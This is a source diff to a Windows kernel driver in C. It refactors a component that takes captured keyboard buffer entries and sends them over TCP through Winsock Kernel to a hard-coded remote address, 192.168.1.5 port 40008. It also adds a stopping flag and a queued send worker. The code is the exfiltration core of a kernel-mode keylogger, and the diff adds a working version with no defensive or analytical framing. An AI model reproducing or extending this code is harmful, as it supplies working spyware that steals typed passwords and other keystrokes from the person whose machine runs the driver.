@@ -11,6 +11,7 @@ typedef struct _MONITOR {
     PMWSK_CONTEXT   WskContext;
     KSPIN_LOCK      Lock;
     LIST_ENTRY      WrkItemList;
+	volatile LONG	Stopping;
 } MONITOR, *PMONITOR;
 
 MONITOR g_Monitor;
@@ -31,6 +32,9 @@ VOID
 {
     PMON_WRK_ITEM WrkItem;
     KIRQL Irql;
+	
+	if (Monitor->Stopping)
+		return;
 
     WrkItem = (PMON_WRK_ITEM)ExAllocatePoolWithTag(NonPagedPool, sizeof(MON_WRK_ITEM), MON_WRK_ITEM_TAG);
     if (WrkItem == NULL) {
@@ -86,53 +90,49 @@ VOID
     SysThreadSignal(&Monitor->Thread);
 }
 
-VOID MonitorSendData(PMONITOR Monitor, PVOID Context)
+VOID MonitorSendKbdBufWorker(PMONITOR Monitor, PKBD_BUFF_ENTRY BuffEntry)
 {
-    NTSTATUS Status;
-    SOCKADDR_IN LocalAddress;
-    SOCKADDR_IN RemoteAddress;
-    PMSOCKET Socket = NULL;
-    PKBD_BUFF_ENTRY BuffEntry = NULL;
-    UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"192.168.1.5");
-    UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
-    UNICODE_STRING RemoteName = {0, 0, NULL};
+	NTSTATUS Status;
+	SOCKADDR_IN LocalAddress;
+	SOCKADDR_IN RemoteAddress;
+	PMSOCKET Socket = NULL;
+	UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"192.168.1.5");
+	UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
+	UNICODE_STRING RemoteName = { 0, 0, NULL };
 
-    IN4ADDR_SETANY(&LocalAddress);
+	IN4ADDR_SETANY(&LocalAddress);
 
-    Status = MWskResolveName(
-        Monitor->WskContext,
-        &NodeName,
-        &ServiceName,
-        NULL,
-        &RemoteAddress
-    );
-    
-    if (!NT_SUCCESS(Status)) {
-        KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
-        goto cleanup;
-    }
-    
-    Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
-    if (!NT_SUCCESS(Status)) {
-        KLog(LError, "MWskSockAddrToStr failure %x", Status);
-        goto cleanup;
-    }
-    
-    KLog(LInfo, "Remote name %ws", RemoteName.Buffer);
-    
-    Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM,  IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
-    if (!NT_SUCCESS(Status)) {
-        KLog(LError, "MWskSocketConnect error %x", Status);
-        goto cleanup;
-    }
+	Status = MWskResolveName(
+		Monitor->WskContext,
+		&NodeName,
+		&ServiceName,
+		NULL,
+		&RemoteAddress
+		);
 
-    BuffEntry = KbdBuffGet(TRUE);
-    if (BuffEntry != NULL) {
-        Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed);
-        if (!NT_SUCCESS(Status))
-            KLog(LError, "send error %x", Status);
-        KbdBuffEntryDelete(BuffEntry);
-    }
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
+		goto cleanup;
+	}
+
+	Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "MWskSockAddrToStr failure %x", Status);
+		goto cleanup;
+	}
+
+	//KLog(LInfo, "Remote name %ws", RemoteName.Buffer);
+
+	Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM, IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "MWskSocketConnect error %x", Status);
+		goto cleanup;
+	}
+
+	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "MWskSendAll error %x", Status);
+	}
 
 cleanup:
     if (RemoteName.Buffer != NULL) {
@@ -141,7 +141,11 @@ cleanup:
 
     if (Socket != NULL)
         MWskSocketRelease(Socket);
-    MonitorQueueWorkItem(Monitor, MonitorSendData, Context);
+}
+
+VOID ECoreSendKbdBuf(PVOID BuffEntry)
+{
+	MonitorQueueWorkItem(&g_Monitor, MonitorSendKbdBufWorker, BuffEntry);
 }
 
 NTSTATUS
@@ -149,6 +153,7 @@ NTSTATUS
 {
     NTSTATUS Status;
 
+	Monitor->Stopping = 0;
     InitializeListHead(&Monitor->WrkItemList);
     KeInitializeSpinLock(&Monitor->Lock);
 
@@ -165,7 +170,6 @@ NTSTATUS
         return Status;
     }
 
-    MonitorQueueWorkItem(Monitor, MonitorSendData, NULL);
     return STATUS_SUCCESS;
 }
 
@@ -174,6 +178,7 @@ VOID
 {
     PMON_WRK_ITEM WrkItem;
 
+	Monitor->Stopping = 1;
     SysThreadStop(&Monitor->Thread);
 
     while ((WrkItem = MonitorGetWkItemToProcess(Monitor)) != NULL) {
